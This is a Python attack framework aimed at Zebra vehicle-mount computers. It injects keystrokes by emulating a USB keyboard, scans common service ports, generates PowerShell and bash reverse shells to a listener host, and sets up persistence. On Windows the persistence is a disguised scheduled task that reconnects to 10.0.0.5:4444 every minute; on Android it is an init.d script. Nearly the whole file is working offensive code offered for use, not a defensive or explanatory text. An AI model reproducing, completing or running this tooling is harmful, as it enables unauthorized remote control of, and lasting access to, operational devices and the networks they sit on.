#!/usr/bin/env python3
"""
Zebra Vehicle Mount Computer Attack Framework
Specialized offensive capabilities for Zebra embedded systems
"""

import argparse
import socket
import time
import random
import os
import sys
import subprocess
from fcntl import ioctl
import struct
import base64

# USB HID Keyboard Codes
KEY_CODES = {
    'a': 4, 'b': 5, 'c': 6, 'd': 7, 'e': 8, 'f': 9, 'g': 10, 'h': 11,
    'i': 12, 'j': 13, 'k': 14, 'l': 15, 'm': 16, 'n': 17, 'o': 18, 'p': 19,
    'q': 20, 'r': 21, 's': 22, 't': 23, 'u': 24, 'v': 25, 'w': 26, 'x': 27,
    'y': 28, 'z': 29, '1': 30, '2': 31, '3': 32, '4': 33, '5': 34, '6': 35,
    '7': 36, '8': 37, '9': 38, '0': 39, 'ENTER': 40, 'ESC': 41, 'BACKSPACE': 42,
    'TAB': 43, 'SPACE': 44, 'MINUS': 45, 'EQUAL': 46, 'LEFTBRACE': 47,
    'RIGHTBRACE': 48, 'BACKSLASH': 49, 'SEMICOLON': 51, 'APOSTROPHE': 52,
    'GRAVE': 53, 'COMMA': 54, 'DOT': 55, 'SLASH': 56, 'CAPSLOCK': 57
}

# Modifier keys
MODIFIERS = {
    'CTRL': 0x01,
    'SHIFT': 0x02,
    'ALT': 0x04,
    'META': 0x08
}

class ZebraVehicleAttack:
    def __init__(self):
        self.usb_device = "/dev/hidg0"
        self.network_timeout = 2
        self.usb_fd = None
        self.open_usb_device()
        self.zebra_services = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            80: "HTTP",
            443: "HTTPS",
            502: "Modbus",
            515: "LPD",
            9100: "JetDirect",
            135: "RPC",
            139: "NetBIOS",
            445: "SMB",
            3389: "RDP",
            5900: "VNC"
        }

    def open_usb_device(self):
        try:
            self.usb_fd = open(self.usb_device, 'wb')
        except Exception as e:
            print(f"[!] USB HID device error: {e}")
            self.usb_fd = None

    def send_usb_report(self, modifier, key):
        if not self.usb_fd:
            return
        report = bytes([modifier, 0, key, 0, 0, 0, 0, 0])
        self.usb_fd.write(report)
        self.usb_fd.flush()
        time.sleep(0.01)
        # Release keys
        self.usb_fd.write(bytes([0, 0, 0, 0, 0, 0, 0, 0]))
        self.usb_fd.flush()

    def press_key(self, key, modifier=0):
        if key in KEY_CODES:
            self.send_usb_report(modifier, KEY_CODES[key])
        elif key.upper() in KEY_CODES:
            self.send_usb_report(MODIFIERS['SHIFT'], KEY_CODES[key.upper()])

    def type_string(self, string, delay=0.05):
        for char in string:
            if char == '\n':
                self.press_key('ENTER')
            elif char == ' ':
                self.press_key('SPACE')
            elif char == '\t':
                self.press_key('TAB')
            else:
                self.press_key(char)
            time.sleep(delay)

    def execute_zebra_command(self, command, platform="windows"):
        if platform == "windows":
            # Zebra Windows Embedded systems often have special keys
            self.press_key('ESC')  # Often brings up menu
            time.sleep(0.5)
            self.type_string("cmd\n")
            time.sleep(1)
            
            # Execute command
            self.type_string(f"{command}\n")
        elif platform == "android":
            # Zebra Android systems
            self.press_key('ESC')  # Often brings up menu
            time.sleep(0.5)
            self.type_string("terminal\n")
            time.sleep(1)
            
            # Execute command
            self.type_string(f"{command}\n")

    def zebra_port_scan(self, target):
        print(f"[+] Scanning Zebra vehicle mount computer: {target}")
        open_ports = []
        
        for port, service in self.zebra_services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.network_timeout)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append((port, service))
                    print(f"[+] Port {port} ({service}) open")
                sock.close()
            except:
                pass
        
        return open_ports

    def generate_zebra_payload(self, lhost, lport, platform="windows"):
        if platform == "windows":
            return f"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\""
        elif platform == "android":
            return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

    def zebra_exploit(self, target_ip, lhost, lport, platform="windows"):
        print("[+] Starting Zebra vehicle mount computer attack")
        
        # Step 1: Network reconnaissance
        print("[+] Network reconnaissance phase")
        open_ports = self.zebra_port_scan(target_ip)
        
        # Step 2: USB attack - open terminal
        print("[+] USB attack phase - opening terminal")
        self.execute_zebra_command("", platform)
        time.sleep(1)
        
        # Step 3: USB attack - execute reverse shell
        print("[+] USB attack phase - executing reverse shell")
        shell = self.generate_zebra_payload(lhost, lport, platform)
        self.type_string(shell + "\n")
        
        # Step 4: Network confirmation
        print("[+] Network confirmation phase")
        if 4444 in [port for port, service in self.zebra_port_scan(lhost)]:
            print("[+] Reverse shell connection established")
        else:
            print("[-] Reverse shell connection not detected")

    def zebra_persistence(self, platform="windows"):
        if platform == "windows":
            # Create scheduled task for persistence
            persistence_cmd = "schtasks /create /tn ZebraUpdate /tr \"powershell -c '$client = New-Object System.Net.Sockets.TCPClient(\\\"10.0.0.5\\\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}'\" /sc minute /mo 1"
            self.execute_zebra_command(persistence_cmd, platform)
        elif platform == "android":
            # Create startup script for persistence
            persistence_cmd = "echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1 &' > /data/local/tmp/zebra_persist.sh && chmod +x /data/local/tmp/zebra_persist.sh && echo '/data/local/tmp/zebra_persist.sh' >> /system/etc/init.d/99zebra"
            self.execute_zebra_command(persistence_cmd, platform)

    def close(self):
        if self.usb_fd:
            self.usb_fd.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zebra Vehicle Mount Computer Attack Framework")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # USB commands
    usb_parser = subparsers.add_parser('usb', help='USB HID attacks for Zebra systems')
    usb_subparsers = usb_parser.add_subparsers(dest='usb_command')
    
    type_parser = usb_subparsers.add_parser('type', help='Type text via USB')
    type_parser.add_argument('text', help='Text to type')
    type_parser.add_argument('--delay', type=float, default=0.05, help='Delay between keystrokes')
    
    exec_parser = usb_subparsers.add_parser('exec', help='Execute command via USB')
    exec_parser.add_argument('command', help='Command to execute')
    exec_parser.add_argument('--platform', choices=['windows', 'android'], default='windows', help='Target platform')
    
    # Network commands
    net_parser = subparsers.add_parser('net', help='Network attacks for Zebra systems')
    net_subparsers = net_parser.add_subparsers(dest='net_command')
    
    scan_parser = net_subparsers.add_parser('scan', help='Zebra-specific port scanner')
    scan_parser.add_argument('target', help='Target IP')
    
    shell_parser = net_subparsers.add_parser('shell', help='Generate Zebra-specific reverse shell')
    shell_parser.add_argument('lhost', help='Listener IP')
    shell_parser.add_argument('lport', type=int, help='Listener port')
    shell_parser.add_argument('--platform', choices=['windows', 'android'], default='windows', help='Target platform')
    
    # Combined attack
    combined_parser = subparsers.add_parser('attack', help='Full Zebra attack')
    combined_parser.add_argument('target_ip', help='Target IP for network scanning')
    combined_parser.add_argument('lhost', help='Listener IP for reverse shell')
    combined_parser.add_argument('lport', type=int, help='Listener port for reverse shell')
    combined_parser.add_argument('--platform', choices=['windows', 'android'], default='windows', help='Target platform')
    
    # Persistence
    persist_parser = subparsers.add_parser('persist', help='Create persistence on Zebra system')
    persist_parser.add_argument('--platform', choices=['windows', 'android'], default='windows', help='Target platform')
    
    args = parser.parse_args()
    
    attack = ZebraVehicleAttack()
    
    try:
        if args.command == 'usb':
            if args.usb_command == 'type':
                print(f"[+] Typing via USB: {args.text}")
                attack.type_string(args.text, args.delay)
            elif args.usb_command == 'exec':
                print(f"[+] Executing via USB: {args.command}")
                attack.execute_zebra_command(args.command, args.platform)
        
        elif args.command == 'net':
            if args.net_command == 'scan':
                attack.zebra_port_scan(args.target)
            elif args.net_command == 'shell':
                shell = attack.generate_zebra_payload(args.lhost, args.lport, args.platform)
                print(f"[+] Zebra reverse shell payload:\n{shell}")
        
        elif args.command == 'attack':
            attack.zebra_exploit(args.target_ip, args.lhost, args.lport, args.platform)
        
        elif args.command == 'persist':
            print("[+] Creating persistence on Zebra system")
            attack.zebra_persistence(args.platform)
    
    finally:
        attack.close()
